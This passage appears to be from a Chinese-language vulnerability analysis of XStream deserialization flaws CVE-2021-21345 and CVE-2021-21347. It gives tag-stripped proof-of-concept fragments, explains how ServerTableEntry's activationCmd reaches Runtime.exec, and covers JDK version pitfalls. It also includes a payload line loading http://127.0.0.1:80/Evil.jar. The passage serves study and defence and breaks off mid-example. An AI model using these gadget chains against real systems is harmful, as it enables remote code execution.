          2
                          com.sun.corba.se.impl.activation.ServerTableEntry
                              com.sun.corba.se.impl.activation.ServerTableEntry
                              verify
                              true
                              1
                              UTF-8
                      open /Applications/Calculator.app
        3
        javax.xml.ws.binding.attachments.inbound
        javax.xml.ws.binding.attachments.inbound
可以看到21345的利用链较之21344的利用链来说变化不大，唯一的不同点在于执行代码的位置不再使用JdbcRowSetImpl去远程加载恶意类来到本地执行恶意代码，而是使用`com.sun.corba.se.impl.activation.ServerTableEntry`类直接在本地执行恶意代码，从利用的复杂度上来和21344做比较的话无疑是简单的不少，既然整个利用链中变化的只有这一处，那就单分析这个类就可以了，将断点直接打在ServerTableEntry类的verify方法上。
这里直接将activationCmd属性中的值作为参数调用Runtime.exec来进行执行，而activationCmd在序列化的数据中就已经被我们自定义了值。
由于调用栈和CVE-2021-21344基本一样所以就不再重复粘贴的，至此CVE-2021-21345分析完毕
## 3\. CVE-2021-21347
首先先看下POC
          2
        3
              text/plain
                      0
                      -1
                      0
                          Evil
                              0
                              1
                                http://127.0.0.1:80/Evil.jar
                          http://127.0.0.1:80/Evil.jar
                        false
                        false
                      true
                  KEYS
                  -2147483648
                  0
                  0
              false
          0
可以看到这个漏洞的利用链就和之前两个大不相同了，并且在分析该漏洞的时候也踩了一些坑，在这里也和大家详细说明一下
这里我先用jdk 1.8.20版本来复现这个漏洞，然而执行的时候却返回以下错误
一开始没太明白这里是出了什么问题
先是跟着报错信息中提示的路径去看了一下，发现是在反序列化PriorityQueue的comparator属性的时候出现了问题。
经过一段跟踪调试，跟踪到类加载的地方发现根本找不到这个ObservableList$1的对象，从这个名字带有$1不难看出，这是一个匿名内部类对象，此时我们先去ObservableList这个类中去查看一下，然后发现ObservableList是一个接口类型，源码如下
    public interface ObservableList extends List, Observable {
        public void addListener(ListChangeListener listener);
        public void removeListener(ListChangeListener listener);
        public boolean addAll(E... elements);
        public boolean setAll(E... elements);
        public boolean setAll(Collection col);
        public boolean removeAll(E... elements);
        public boolean retainAll(E... elements);
        public void remove(int from, int to);
        public default FilteredList filtered(Predicate predicate) {
            return new FilteredList<>(this, predicate);
        }
        public default SortedList sorted(Comparator comparator) {
            return new SortedList<>(this, comparator);
        }
        public default SortedList sorted() {
            return sorted(null);
        }
    }
发现根本就没有什么匿名内部类，此时分析陷入了僵局，然后经过该漏洞的作者threedr3am师傅的指导，尝试更换了下JDK的版本，将JDK版本更换为1.8.131版本后ObservableList的源码发生了变化。这里只粘贴关键的代码。
    public default SortedList sorted(Comparator comparator) {
        return new SortedList<>(this, comparator);
    }
    /**
     * Creates a {@link SortedList} wrapper of this list with the natural
     * ordering.
     * @return new {@code SortedList}
     * @since JavaFX 8.0
     */
    public default SortedList sorted() {
        Comparator naturalOrder = new Comparator() {
            @Override
            public int compare(E o1, E o2) {
                if (o1 == null && o2 == null) {
                    return 0;
                }
                if (o1 == null) {
                    return -1;
                }
                if (o2 == null) {
                    return 1;
                }
                if (o1 instanceof Comparable) {
                    return ((Comparable) o1).compareTo(o2);
                }
                return Collator.getInstance().compare(o1.toString(), o2.toString());
            }
        };
        return sorted(naturalOrder);
    }
可以看到sorted()方法里面多了一个Comparator类型的匿名内部类对象，而这个就是我们反序列化是POC中的那个ObservableList$1，这里写一个简单的例子验证一下
该漏洞利用的时候对JDK的版本有一定的限制，
接下来开始继续分析，然后当我用JDK1.8.131再次运行的时候又爆了另一个错误
这里提示找不到 java.security.ProtectionDomain$Key.outer-class这个属性，然后经过一段让人头秃的调试后终于搞明白了其中缘由。
首先着重看一下出现问题的POC的位置
导致报错的就是这个outer-class标签，报错的原因是反序列化的时候找不到这个outer-class属性，我们来到对应的类也就是ProtectionDomain$Key这个类中查看一下
发现key是一个静态内部类。
接下来我们要搞明白，就XStream在什么情况下在序列化的数据中出现这个outer-class标签，这里进行一个简单的实验
    class Foo {
        private String foocontent;
        private Bar bar;
        public String getFoocontent() {
            return foocontent;
        }
        public void setFoocontent(String foocontent) {
            this.foocontent = foocontent;
        }
        public Bar getBar() {
            return bar;
        }
        public void setBar(Bar bar) {
            this.bar = bar;
        }
        class Bar {
            private String blabla;
            public String getBlabla() {
                return blabla;
            }
            public void setBlabla(String blabla) {
                this.blabla = blabla;
            }
        }
    }
这里有两个类，一个是Foo类，另一个Bar是一个成员内部类，这里Foo有一个属性bar用来存储一个Bar类型的数据。接下来我们实例化一下这个类，然后对其属性进行赋值，并用XStream对其进行序列化。
        public static void main(String[] args) {
            Foo foo = new Foo();
            Bar bar = foo.new Bar();